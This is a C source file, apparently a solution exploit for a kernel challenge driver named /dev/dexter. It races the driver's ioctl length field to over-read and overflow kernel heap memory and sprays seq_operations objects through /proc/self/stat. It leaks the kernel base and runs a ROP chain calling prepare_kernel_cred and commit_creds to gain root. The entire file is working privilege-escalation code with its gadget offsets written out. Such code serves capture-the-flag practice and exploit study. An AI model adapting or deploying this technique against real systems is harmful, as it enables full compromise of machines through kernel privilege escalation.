#include "kpwn.h"
#include "struct.h"

int fd;
int race_win = 0;
request_t req;

int set(char *buf, size_t len)
{
    req.ptr = buf;
    req.len = len;
    return ioctl(fd, CMD_SET, &req);
}

int get(char *buf, size_t len)
{
    req.ptr = buf;
    req.len = len;
    return ioctl(fd, CMD_GET, &req);
}

void *race(void *arg)
{
    const size_t len = (size_t)arg;
    while (!race_win)
    {
        req.len = len;
        usleep(10);
    }
    return NULL;
}

void overread(char *buf, size_t len)
{
    char *zero = calloc(1, len);
    if (!zero)
        errExit("calloc");

    pthread_t th;
    pthread_create(&th, NULL, race, (void *)len);

    memset(buf, 0, len);
    while (!race_win)
    {
        get(buf, 0x20);
        if (memcmp(buf, zero, len) != 0)
        {
            race_win = 1;
            break;
        }
    }
    pthread_join(th, NULL);
    race_win = 0;
    free(zero);
}

void overwrite(char *buf, size_t len)
{
    pthread_t th;
    char *tmp = calloc(1, len);
    if (!tmp)
        errExit("calloc");

    while (1)
    {
        pthread_create(&th, NULL, race, (void *)len);
        for (int i = 0; i < 0x10000; i++)
            set(buf, 0x20);
        race_win = 1;
        pthread_join(th, NULL);
        race_win = 0;
        overread(tmp, len);
        if (memcmp(tmp, buf, len) == 0)
            break; // Check if heap overflow succeeded
    }
    free(tmp);
}

int main(int argc, char **argv, char **envp)
{
    save_state();
    char buf[0x500] = {0};

    int spray[800] = {0};
    for (int i = 0; i < 800 / 2; i++)
    {
        spray[i] = open("/proc/self/stat", O_RDONLY);
    }

    fd = open("/dev/dexter", O_RDWR);
    if (fd < 0)
        errExit("open");

    for (int i = 800 / 2; i < 800; i++)
    {
        spray[i] = open("/proc/self/stat", O_RDONLY);
    }

    overread(buf, 0x500);
    // hex_dump(buf, 0x500);

    uint64_t kbase = *(uint64_t *)&buf[0x20] - (0xffffffff81170f80 - 0xffffffff81000000);
    logOK("Kernel base: 0x%lx", kbase);

    // Find start of start pointer function in seq_operations
    int start_idx = -1;
    for (int i = 0; i <= sizeof(buf); i += 8)
    {
        uint64_t ptr = *(uint64_t *)&buf[i];
        if (ptr == KADDR(0xffffffff81170f80))
        {
            start_idx = i;
            break;
        }
    }
    if (start_idx == -1)
        errExit("start_idx == -1");
    logOK("Found start pointer at buf[0x%03x]", start_idx);

    void *map = mmap((void *)(0xf6000000 - 0x8000), 0x10000, PROT_READ | PROT_WRITE,
                     MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (map == MAP_FAILED)
        errExit("mmap");
    logInfo("Mapped memory at %p", map);

    uint64_t *rop = (uint64_t *)(0xf6000000);
    int idx = 0;

    uint64_t pop_rdi = KADDR(0xffffffff8109b0cd);
    uint64_t pop_rcx = KADDR(0xffffffff8110d88b);
    uint64_t mov_rdi_rax = KADDR(0xffffffff8163d0ab);
    uint64_t mov_esp_0xf6000000 = KADDR(0xffffffff81520224);
    uint64_t commit_creds = KADDR(0xffffffff81072810);
    uint64_t prepare_kernel_cred = KADDR(0xffffffff810729b0);
    uint64_t swapgs_restore_regs_and_return_to_usermode = KADDR(0xffffffff81800e10);

    rop[idx++] = pop_rdi;
    rop[idx++] = 0;
    rop[idx++] = prepare_kernel_cred;
    rop[idx++] = pop_rcx;
    rop[idx++] = 0;
    rop[idx++] = mov_rdi_rax;
    rop[idx++] = commit_creds;
    rop[idx++] = swapgs_restore_regs_and_return_to_usermode + 22;
    rop[idx++] = 0; // dummy
    rop[idx++] = 0; // dummy
    rop[idx++] = user_rip;
    rop[idx++] = user_cs;
    rop[idx++] = user_rflags;
    rop[idx++] = user_rsp;
    rop[idx++] = user_ss;

    size_t buf_len = sizeof(buf);
    for (int off = start_idx; off + 8 <= (int)buf_len; off += start_idx)
    {
        *(uint64_t *)&buf[off] = mov_esp_0xf6000000;
    }

    overwrite(buf, 0x500);
    // overread(buf, 0x500);
    // hex_dump(buf, 0x500); // check again

    for (int i = 0; i < 800; i++)
        read(spray[i], buf, 0x100);
    for (int i = 0; i < 800; i++)
        close(spray[i]);

    close(fd);
    return 0;
}
